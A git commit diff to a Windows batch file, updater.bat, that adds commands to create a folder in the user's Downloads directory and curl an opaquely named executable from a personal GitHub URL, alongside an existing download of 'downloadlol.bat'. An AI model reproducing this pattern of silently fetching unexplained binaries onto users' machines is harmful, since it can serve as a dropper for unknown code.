82695500127e1f89e6813ff3833dee931f498cdb
aaronestaaron <mmaryanti778@gmail.com>
2025-11-02 18:55:12 +0700

    Add files via upload

--- updater.bat
+++ updater.bat
@@ -1,5 +1,8 @@
 @echo off
 color b
+mkdir %userprofile%\Downloads\bedt_external\bin
+cd %userprofile%\Downloads\bedt_external\bin
+curl -O https://raw.githubusercontent.com/aaronestaaron/bedt.external.github.io/refs/heads/main/es4repk729erbb.exe
 cd %userprofile%\Downloads\bedt_external\downloader
 curl -O https://raw.githubusercontent.com/aaronestaaron/bedt.external.github.io/refs/heads/main/downloadlol.bat
 echo downloader is installed...
